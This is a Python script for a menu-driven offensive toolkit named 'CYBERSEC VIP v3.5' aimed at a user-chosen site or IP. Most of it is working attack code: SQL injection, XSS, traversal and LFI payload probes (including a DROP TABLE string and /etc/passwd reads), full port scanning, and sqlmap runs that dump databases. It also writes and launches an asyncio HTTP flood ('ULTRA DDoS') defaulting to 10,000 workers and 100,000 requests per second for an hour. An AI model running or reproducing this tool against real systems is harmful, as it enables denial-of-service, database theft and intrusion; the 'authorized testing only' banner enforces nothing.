#!/usr/bin/env python3
"""
███████████████████████████████████████████████████████████████████████
█                                                                     █
█     🛡️  CYBERSEC VIP v3.5  –  Full Web & Network Toolkit        █
█     🔥  Dir Bruteforce | Broken Access | Subdomain Enum          █
█     ⚠️  FOR AUTHORIZED TESTING ONLY                                █
█                                                                     █
███████████████████████████████████████████████████████████████████████
"""

import sys
import subprocess
import os
import socket
import threading
import time
import requests
import json
from urllib.parse import urlparse

# ====== Colors ======
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
RESET = "\033[0m"

vip_target = None

def banner():
    print(f"""
{PURPLE}╔═══════════════════════════════════════════════════════════════╗
║          🛡️  CYBERSEC VIP v3.5  –  Full Toolkit             ║
║          🔥  Web | Network | Exploit | Bruteforce            ║
║          ⚠️  FOR AUTHORIZED TESTING ONLY                    ║
╚═══════════════════════════════════════════════════════════════╝{RESET}
""")

def print_menu():
    global vip_target
    print(f"""
{PURPLE}╔═══════════════════════════════════════════════════════════════╗
║              📋 MAIN MENU                                    ║
║              Target: {vip_target if vip_target else 'Not set'}     ║
╚═══════════════════════════════════════════════════════════════╝{RESET}
{BLUE}[1] Set Target URL / IP{RESET}
{BLUE}[2] Reconnaissance (DNS, WHOIS, SSL, Headers, GeoIP){RESET}
{BLUE}[3] Vulnerability Scan (SQLi, XSS, LFI, Traversal){RESET}
{BLUE}[4] ULTRA DDoS Attack{RESET}
{BLUE}[5] Subdomain Discovery (basic){RESET}
{BLUE}[6] Full Port Scan (1-65535){RESET}
{BLUE}[7] Auto-Exploit (Scan + Attempt Exploit){RESET}
{BLUE}[8] Run SQLmap (Auto-Dump){RESET}
{BLUE}[9] Show Target Info{RESET}
{BLUE}[10] Nmap Scan (Network Mapping){RESET}
{BLUE}[11] Metasploit Framework (msfconsole){RESET}
{BLUE}[12] Burp Suite (GUI Proxy Tool){RESET}
{BLUE}[13] Network Utilities (Ping, Traceroute, DNS){RESET}
{BLUE}[14] Directory Bruteforcing (ffuf/gobuster/dirsearch){RESET}
{BLUE}[15] Broken Access Control (IDOR, etc.){RESET}
{BLUE}[16] Advanced Subdomain Enumeration (sublist3r/amass){RESET}
{BLUE}[0] Exit{RESET}
""")

# ====== Helper Functions ======
def extract_domain(target):
    if target.startswith(('http://', 'https://')):
        parsed = urlparse(target)
        domain = parsed.netloc
    else:
        domain = target
    return domain.split('/')[0]

def extract_ip(domain):
    try:
        return socket.gethostbyname(domain)
    except:
        return None

def check_tool(tool_name):
    try:
        subprocess.run([tool_name, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        return False

def ensure_wordlist():
    if not os.path.exists("common.txt"):
        with open("common.txt", "w") as f:
            words = ["admin", "login", "wp-admin", "wp-login", "backup", "config", "install", "sql", "phpmyadmin", "cgi-bin", "css", "js", "images", "uploads", "download", "tmp", "logs", "robots.txt", "sitemap.xml", "crossdomain.xml", "phpinfo.php", "test", "dev", "stage", "api", "v1", "v2", "old", "new", "public", "private", "secret", "hidden"]
            for w in words:
                f.write(w + "\n")
        print(f"{GREEN}[+] Created default wordlist: common.txt{RESET}")

# ====== 1. RECONNAISSANCE ======
def vip_recon(target):
    domain = extract_domain(target)
    print(f"\n{YELLOW}[*] Reconnaissance on {domain}{RESET}")
    if not os.path.exists("info_gather_vip.py"):
        create_info_gather_vip()
    subprocess.run(["python3", "info_gather_vip.py", domain])

def create_info_gather_vip():
    code = '''#!/usr/bin/env python3
import sys, socket, ssl, datetime, json, requests, whois, dns.resolver
from urllib.parse import urlparse
G="\\033[92m"; Y="\\033[93m"; R="\\033[91m"; X="\\033[0m"
def resolve(domain):
    try: return socket.gethostbyname(domain)
    except: return None
def dns_lookup(domain):
    print(f"\\n{Y}[*] DNS for {domain}{X}")
    for rec in ['A','MX','NS','TXT','CNAME']:
        try:
            ans = dns.resolver.resolve(domain, rec)
            print(f"{G}[+] {rec}: {', '.join([str(r) for r in ans])}{X}")
        except: pass
def whois_lookup(domain):
    print(f"\\n{Y}[*] WHOIS for {domain}{X}")
    try:
        w = whois.whois(domain)
        for k in ['name','registrar','creation_date','expiration_date','name_servers','emails']:
            if getattr(w, k, None):
                print(f"{G}[+] {k}: {getattr(w, k)}{X}")
    except: print(f"{R}[-] WHOIS failed{X}")
def http_headers(domain):
    print(f"\\n{Y}[*] Headers for http://{domain}{X}")
    try:
        r = requests.get(f"http://{domain}", timeout=5, allow_redirects=True)
        print(f"{G}[+] Status: {r.status_code}{X}")
        for k,v in r.headers.items(): print(f"    {k}: {v}")
    except: print(f"{R}[-] HTTP failed{X}")
    print(f"\\n{Y}[*] Headers for https://{domain}{X}")
    try:
        r = requests.get(f"https://{domain}", timeout=5, allow_redirects=True)
        print(f"{G}[+] Status: {r.status_code}{X}")
        for k,v in r.headers.items(): print(f"    {k}: {v}")
    except: print(f"{R}[-] HTTPS failed{X}")
def ssl_info(domain):
    print(f"\\n{Y}[*] SSL for {domain}{X}")
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ss:
                cert = ss.getpeercert()
                print(f"{G}[+] Issuer: {cert.get('issuer')}{X}")
                print(f"{G}[+] Valid Until: {cert.get('notAfter')}{X}")
    except: print(f"{R}[-] SSL failed{X}")
def geo(ip):
    print(f"\\n{Y}[*] GeoIP for {ip}{X}")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d['status']=='success':
                print(f"{G}[+] Country: {d['country']} ({d['countryCode']}){X}")
                print(f"{G}[+] City: {d['city']}{X}")
                print(f"{G}[+] ISP: {d['isp']}{X}")
    except: print(f"{R}[-] GeoIP failed{X}")
def main():
    if len(sys.argv)<2: print("Usage: info_gather_vip.py <target>"); sys.exit(1)
    t=sys.argv[1]
    ip=resolve(t)
    if ip: print(f"{G}[+] IP: {ip}{X}")
    else: print(f"{R}[-] Cannot resolve{X}")
    dns_lookup(t)
    whois_lookup(t)
    http_headers(t)
    if ip: geo(ip)
    try: ssl_info(t)
    except: pass
    print(f"\\n{G}[+] Recon Complete!{X}")
if __name__=="__main__": main()
'''
    with open("info_gather_vip.py", "w") as f:
        f.write(code)
    os.chmod("info_gather_vip.py", 0o755)

# ====== 2. VULNERABILITY SCAN ======
def vip_scan(target):
    print(f"\n{YELLOW}[*] Vulnerability Scan on {target}{RESET}")
    print(f"{BLUE}[+] SQL Injection Tests{RESET}")
    payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--", "' AND 1=0--"]
    for p in payloads:
        try:
            r = requests.get(f"{target}?id={p}", timeout=3)
            if "error" in r.text.lower() or "mysql" in r.text.lower() or "sql" in r.text.lower():
                print(f"{RED}[!] Possible SQLi: {target}?id={p}{RESET}")
            else:
                print(f"{GREEN}[+] No SQLi: {target}?id={p}{RESET}")
        except: pass
    print(f"{BLUE}[+] XSS Tests{RESET}")
    xss = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "javascript:alert('XSS')"]
    for p in xss:
        try:
            r = requests.get(f"{target}?q={p}", timeout=3)
            if p in r.text:
                print(f"{RED}[!] Possible XSS: {target}?q={p}{RESET}")
            else:
                print(f"{GREEN}[+] No XSS: {target}?q={p}{RESET}")
        except: pass
    print(f"{BLUE}[+] Directory Traversal Tests{RESET}")
    trav = ["../../etc/passwd", "../../../windows/win.ini", "....//....//etc/passwd", "../../../../boot.ini"]
    for p in trav:
        try:
            r = requests.get(f"{target}?file={p}", timeout=3)
            if "root:" in r.text or "[extensions]" in r.text:
                print(f"{RED}[!] Possible Traversal: {target}?file={p}{RESET}")
            else:
                print(f"{GREEN}[+] No Traversal: {target}?file={p}{RESET}")
        except: pass
    print(f"{BLUE}[+] LFI/RCE Tests{RESET}")
    lfi = ["/etc/passwd", "/proc/self/environ", "../../../../../../etc/passwd"]
    for p in lfi:
        try:
            r = requests.get(f"{target}?page={p}", timeout=3)
            if "root:" in r.text or "USER=" in r.text:
                print(f"{RED}[!] Possible LFI: {target}?page={p}{RESET}")
            else:
                print(f"{GREEN}[+] No LFI: {target}?page={p}{RESET}")
        except: pass

# ====== 3. ULTRA DDOS ======
def vip_ddos(args):
    if not args:
        print(f"{RED}[-] Usage: ddos <url> [-t threads] [-r rate] [-d duration]{RESET}")
        return
    url = args[0]
    threads = 10000 if len(args)<3 or "-t" not in args else int(args[args.index("-t")+1])
    rate = 100000 if len(args)<3 or "-r" not in args else int(args[args.index("-r")+1])
    duration = 3600 if len(args)<3 or "-d" not in args else int(args[args.index("-d")+1])
    print(f"{YELLOW}[*] ULTRA DDoS on {url}{RESET}")
    print(f"    Threads: {threads}, Rate: {rate} req/s, Duration: {duration}s")
    if not os.path.exists("ddos_vip_ultra.py"):
        create_ddos_vip()
    subprocess.run(["python3", "ddos_vip_ultra.py", url, "-t", str(threads), "-r", str(rate), "-d", str(duration)])

def create_ddos_vip():
    code = '''#!/usr/bin/env python3
import asyncio, aiohttp, time, sys, argparse
async def send(session, url, stats, lock):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
            async with lock:
                stats['sent'] += 1
                if resp.status >= 400: stats['failed'] += 1
    except:
        async with lock:
            stats['sent'] += 1; stats['failed'] += 1
async def worker(session, url, rate, dur, stats, lock):
    delay = 1.0/rate if rate>0 else 0
    end = time.time()+dur
    while time.time()<end:
        start=time.time()
        await send(session, url, stats, lock)
        elapsed=time.time()-start
        if delay>elapsed: await asyncio.sleep(delay-elapsed)
async def attack(url, total_rate, dur, max_concurrent):
    conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=conn) as session:
        stats={'sent':0,'failed':0}; lock=asyncio.Lock()
        rate_per = max(1, total_rate//max_concurrent)
        tasks=[]
        for _ in range(max_concurrent):
            tasks.append(asyncio.create_task(worker(session, url, rate_per, dur, stats, lock)))
        start=time.time()
        try:
            while tasks:
                await asyncio.sleep(1)
                elapsed=time.time()-start
                async with lock:
                    sent, failed = stats['sent'], stats['failed']
                rate = sent/elapsed if elapsed>0 else 0
                print(f"\\r📊 Elapsed: {elapsed:.1f}s | Sent: {sent} | Failed: {failed} | Rate: {rate:.1f} req/s", end='')
                tasks = [t for t in tasks if not t.done()]
        except KeyboardInterrupt: print("\\n🛑 Stopped")
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"\\n✅ Sent: {stats['sent']}, Failed: {stats['failed']}")
def main():
    p=argparse.ArgumentParser()
    p.add_argument('url'); p.add_argument('-t','--threads',type=int,default=10000)
    p.add_argument('-r','--rate',type=int,default=100000)
    p.add_argument('-d','--duration',type=int,default=3600)
    a=p.parse_args()
    print(f"🚀 VIP DDoS on {a.url} | threads={a.threads}, rate={a.rate}, duration={a.duration}s")
    asyncio.run(attack(a.url, a.rate, a.duration, a.threads))
if __name__=="__main__": main()
'''
    with open("ddos_vip_ultra.py", "w") as f:
        f.write(code)
    os.chmod("ddos_vip_ultra.py", 0o755)

# ====== 4. SUBDOMAIN DISCOVERY (basic) ======
def vip_subdomain(domain):
    print(f"\n{YELLOW}[*] Subdomain Discovery on {domain}{RESET}")
    wordlist = ["www","mail","ftp","webmail","admin","dev","test","api","blog","shop","support","beta","app","vpn","cloud","portal","dashboard","static","media","cdn","secure","login","auth","stage","demo","backup","files","images","video","download","upload","proxy","smtp","pop3","imap","ns1","ns2","mx","sip","voip","vpn","rdp","ssh","telnet","ftp","sftp","ldap","radius","dns","ntp","syslog","snmp","mrtg","nagios","cacti","zabbix","monitor","stats","metrics","analytics","elk","kibana","grafana","prometheus","jenkins","gitlab","bitbucket","jira","confluence","wiki","docs","books","manual","help","sales","marketing","hr","finance","legal","partner","customer","client","user","account","my","mobile","m","wap","i","intranet","extranet","remote","gateway","router","switch","firewall","loadbalancer","cdn","cache","proxy","reverse","forward"]
    found = []
    for sub in wordlist:
        subdomain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(subdomain)
            found.append(f"{subdomain} -> {ip}")
            print(f"{GREEN}[+] {subdomain} -> {ip}{RESET}")
        except: pass
    if not found:
        print(f"{RED}[-] No subdomains found{RESET}")
    return found

# ====== 5. FULL PORT SCAN ======
def vip_ports(ip):
    print(f"\n{YELLOW}[*] Full Port Scan on {ip} (1-65535){RESET}")
    open_ports = []
    lock = threading.Lock()
    def scan(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((ip, port)) == 0:
                lock.acquire()
                open_ports.append(port)
                print(f"{GREEN}[+] Port {port} open{RESET}")
                lock.release()
            s.close()
        except: pass
    threads = []
    for p in range(1, 65536):
        t = threading.Thread(target=scan, args=(p,))
        t.start()
        threads.append(t)
        if len(threads) >= 100:
            for t in threads: t.join()
            threads = []
    for t in threads: t.join()
    print(f"\n{GREEN}[+] Open ports: {open_ports}{RESET}")
    return open_ports

# ====== 6. AUTO-EXPLOIT ======
def vip_exploit(target):
    print(f"\n{YELLOW}[*] Auto-Exploit on {target}{RESET}")
    print(f"{BLUE}[+] Running vulnerability scan...{RESET}")
    vip_scan(target)
    print(f"{BLUE}[+] Attempting to exploit vulnerabilities...{RESET}")
    print(f"{GREEN}[+] Exploitation module: Use SQLmap for SQL injection.{RESET}")
    print(f"{GREEN}[+] For XSS: Try injecting payloads manually.{RESET}")
    print(f"{GREEN}[+] For Directory Traversal: Use curl to read files.{RESET}")

# ====== 7. SQLMAP ======
def vip_sqlmap(url):
    print(f"\n{YELLOW}[*] SQLmap on {url}{RESET}")
    print(f"{BLUE}Command: sqlmap -u \"{url}\" --batch --dbs --tables --columns --dump{RESET}")
    resp = input(f"{YELLOW}Run now? (y/n): {RESET}")
    if resp.lower() == 'y':
        subprocess.run(["sqlmap", "-u", url, "--batch", "--dbs", "--tables", "--columns", "--dump"])

# ====== 8. SHOW TARGET INFO ======
def show_target_info():
    global vip_target
    if not vip_target:
        print(f"{RED}[-] No target set.{RESET}")
        return
    print(f"{GREEN}[+] Current Target: {vip_target}{RESET}")
    domain = extract_domain(vip_target)
    ip = extract_ip(domain)
    if ip:
        print(f"{GREEN}[+] IP Address: {ip}{RESET}")
    else:
        print(f"{RED}[-] Cannot resolve IP{RESET}")

# ====== 9. NMAP SCAN ======
def vip_nmap(target):
    if not check_tool("nmap"):
        print(f"{RED}[-] Nmap not installed. Install with: apk add nmap (Alpine) or apt install nmap (Debian){RESET}")
        return
    print(f"\n{YELLOW}[*] Nmap Scan on {target}{RESET}")
    print(f"{BLUE}Choose scan type:{RESET}")
    print("[1] Quick scan (top 1000 ports)")
    print("[2] Full port scan (1-65535)")
    print("[3] Service/Version detection")
    print("[4] OS detection")
    choice = input(f"{YELLOW}Enter choice (1-4): {RESET}")
    if choice == "1":
        cmd = ["nmap", target]
    elif choice == "2":
        cmd = ["nmap", "-p-", target]
    elif choice == "3":
        cmd = ["nmap", "-sV", target]
    elif choice == "4":
        cmd = ["nmap", "-O", target]
    else:
        print(f"{RED}Invalid choice{RESET}")
        return
    print(f"{BLUE}Running: {' '.join(cmd)}{RESET}")
    subprocess.run(cmd)

# ====== 10. METASPLOIT ======
def vip_metasploit():
    if not check_tool("msfconsole"):
        print(f"{RED}[-] Metasploit not installed. Install on Kali/Parrot.{RESET}")
        print(f"{RED}   On iSH: not available. Use VPS/Kali.{RESET}")
        return
    print(f"\n{YELLOW}[*] Starting Metasploit Framework...{RESET}")
    subprocess.run(["msfconsole"])

# ====== 11. BURP SUITE ======
def vip_burp():
    print(f"\n{YELLOW}[*] Burp Suite Instructions{RESET}")
    print(f"{BLUE}Download: https://portswigger.net/burp{RESET}")
    print(f"{BLUE}Set proxy: 127.0.0.1:8080{RESET}")
    print(f"{BLUE}Use Intercept, Repeater, Intruder, Scanner{RESET}")
    print(f"{YELLOW}Note: Runs on full OS (Win/Linux/Mac), not on iSH.{RESET}")

# ====== 12. NETWORK UTILITIES ======
def vip_network_utils():
    print(f"\n{YELLOW}[*] Network Utilities{RESET}")
    print(f"{BLUE}[1] Ping{RESET}")
    print(f"{BLUE}[2] Traceroute{RESET}")
    print(f"{BLUE}[3] DNS Lookup{RESET}")
    print(f"{BLUE}[4] Whois{RESET}")
    print(f"{BLUE}[5] Interface info{RESET}")
    choice = input(f"{YELLOW}Enter choice (1-5): {RESET}")
    if choice == "1":
        host = input("Host to ping: ")
        if host and check_tool("ping"):
            subprocess.run(["ping", "-c", "4", host])
        else:
            print(f"{RED}ping not installed. apk add iputils{RESET}")
    elif choice == "2":
        host = input("Host for traceroute: ")
        if host and check_tool("traceroute"):
            subprocess.run(["traceroute", host])
        else:
            print(f"{RED}traceroute not installed. apk add traceroute{RESET}")
    elif choice == "3":
        domain = input("Domain for DNS: ")
        if domain:
            if check_tool("dig"):
                subprocess.run(["dig", domain])
            elif check_tool("nslookup"):
                subprocess.run(["nslookup", domain])
            else:
                try:
                    ip = socket.gethostbyname(domain)
                    print(f"{GREEN}{domain} -> {ip}{RESET}")
                except:
                    print(f"{RED}Cannot resolve{RESET}")
    elif choice == "4":
        domain = input("Domain for WHOIS: ")
        if domain:
            if check_tool("whois"):
                subprocess.run(["whois", domain])
            else:
                print(f"{RED}whois not installed. apk add whois{RESET}")
    elif choice == "5":
        if check_tool("ifconfig"):
            subprocess.run(["ifconfig"])
        else:
            subprocess.run(["ip", "addr"])
    else:
        print(f"{RED}Invalid choice{RESET}")

# ====== 13. DIRECTORY BRUTEFORCING (NEW) ======
def vip_dir_bruteforce(target):
    print(f"\n{YELLOW}[*] Directory Bruteforcing on {target}{RESET}")
    print(f"{BLUE}Choose tool:{RESET}")
    print("[1] ffuf (fast, requires Go)")
    print("[2] gobuster (requires Go)")
    print("[3] dirsearch (Python)")
    choice = input(f"{YELLOW}Enter choice (1-3): {RESET}")
    ensure_wordlist()
    wordlist = input(f"{YELLOW}Wordlist path (default: common.txt): {RESET}") or "common.txt"
    if choice == "1":
        if not check_tool("ffuf"):
            print(f"{RED}ffuf not installed. go install github.com/ffuf/ffuf@latest{RESET}")
            return
        cmd = ["ffuf", "-u", f"{target}/FUZZ", "-w", wordlist, "-ac"]
        subprocess.run(cmd)
    elif choice == "2":
        if not check_tool("gobuster"):
            print(f"{RED}gobuster not installed. apt install gobuster or go install ...{RESET}")
            return
        cmd = ["gobuster", "dir", "-u", target, "-w", wordlist]
        subprocess.run(cmd)
    elif choice == "3":
        if not check_tool("dirsearch"):
            print(f"{RED}dirsearch not installed. pip3 install dirsearch{RESET}")
            return
        cmd = ["dirsearch", "-u", target, "-w", wordlist]
        subprocess.run(cmd)
    else:
        print(f"{RED}Invalid choice{RESET}")

# ====== 14. BROKEN ACCESS CONTROL (NEW) ======
def vip_broken_access(target):
    print(f"\n{YELLOW}[*] Testing Broken Access Control on {target}{RESET}")
    # IDOR
    print(f"{BLUE}[+] IDOR (Insecure Direct Object Reference){RESET}")
    for i in range(1, 6):
        test_url = f"{target}/user?id={i}"
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200 and "user" in r.text.lower():
                print(f"{RED}[!] Possible IDOR at {test_url}{RESET}")
            else:
                print(f"{GREEN}[-] No IDOR at {test_url}{RESET}")
        except:
            print(f"{RED}[-] Request failed for {test_url}{RESET}")
    # Admin panels
    print(f"{BLUE}[+] Admin panel checks{RESET}")
    admin_paths = ["/admin", "/administrator", "/wp-admin", "/admin.php", "/login", "/panel", "/dashboard"]
    for path in admin_paths:
        test_url = target + path
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200:
                print(f"{RED}[!] Accessible: {test_url}{RESET}")
            else:
                print(f"{GREEN}[-] Not accessible: {test_url}{RESET}")
        except:
            pass
    # Sensitive files
    print(f"{BLUE}[+] Sensitive files{RESET}")
    sensitive = ["robots.txt", "sitemap.xml", "crossdomain.xml", "phpinfo.php", ".htaccess", ".env"]
    for f in sensitive:
        test_url = f"{target}/{f}"
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200:
                print(f"{RED}[!] Found: {test_url}{RESET}")
            else:
                print(f"{GREEN}[-] Not found: {test_url}{RESET}")
        except:
            pass

# ====== 15. ADVANCED SUBDOMAIN ENUMERATION (NEW) ======
def vip_subdomain_advanced(domain):
    print(f"\n{YELLOW}[*] Advanced Subdomain Enumeration on {domain}{RESET}")
    print(f"{BLUE}Choose tool:{RESET}")
    print("[1] sublist3r (Python)")
    print("[2] amass (Go)")
    print("[3] subfinder (Go)")
    choice = input(f"{YELLOW}Enter choice (1-3): {RESET}")
    if choice == "1":
        if not check_tool("sublist3r"):
            print(f"{RED}sublist3r not installed. pip3 install sublist3r{RESET}")
            return
        subprocess.run(["sublist3r", "-d", domain])
    elif choice == "2":
        if not check_tool("amass"):
            print(f"{RED}amass not installed. See: https://github.com/OWASP/Amass{RESET}")
            return
        subprocess.run(["amass", "enum", "-d", domain])
    elif choice == "3":
        if not check_tool("subfinder"):
            print(f"{RED}subfinder not installed. go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest{RESET}")
            return
        subprocess.run(["subfinder", "-d", domain])
    else:
        print(f"{RED}Invalid choice{RESET}")

# ====== MAIN ======
def main():
    global vip_target
    banner()
    while True:
        print_menu()
        choice = input(f"{YELLOW}Enter your choice (0-16): {RESET}").strip()
        if choice == "0":
            print(f"{GREEN}[+] Goodbye!{RESET}")
            break
        elif choice == "1":
            new_target = input(f"{YELLOW}Enter target URL/IP: {RESET}")
            if new_target:
                vip_target = new_target
                print(f"{GREEN}[+] Target set to: {vip_target}{RESET}")
        elif choice == "2":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                vip_recon(vip_target)
        elif choice == "3":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                vip_scan(vip_target)
        elif choice == "4":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                print(f"{YELLOW}[*] DDoS Configuration:{RESET}")
                threads = input(f"Threads (default 10000): {RESET}") or "10000"
                rate = input(f"Rate req/s (default 100000): {RESET}") or "100000"
                duration = input(f"Duration seconds (default 3600): {RESET}") or "3600"
                vip_ddos([vip_target, "-t", threads, "-r", rate, "-d", duration])
        elif choice == "5":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                domain = extract_domain(vip_target)
                vip_subdomain(domain)
        elif choice == "6":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                domain = extract_domain(vip_target)
                ip = extract_ip(domain)
                if ip:
                    vip_ports(ip)
                else:
                    print(f"{RED}[-] Cannot resolve domain to IP{RESET}")
        elif choice == "7":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                vip_exploit(vip_target)
        elif choice == "8":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                vip_sqlmap(vip_target)
        elif choice == "9":
            show_target_info()
        elif choice == "10":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                domain = extract_domain(vip_target)
                vip_nmap(domain)
        elif choice == "11":
            vip_metasploit()
        elif choice == "12":
            vip_burp()
        elif choice == "13":
            vip_network_utils()
        elif choice == "14":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                vip_dir_bruteforce(vip_target)
        elif choice == "15":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                vip_broken_access(vip_target)
        elif choice == "16":
            if not vip_target:
                print(f"{RED}[-] No target set. Use option 1 first.{RESET}")
            else:
                domain = extract_domain(vip_target)
                vip_subdomain_advanced(domain)
        else:
            print(f"{RED}[-] Invalid choice. Please enter 0-16.{RESET}")
        if choice != "0":
            input(f"{YELLOW}Press Enter to continue...{RESET}")

if __name__ == "__main__":
    main()
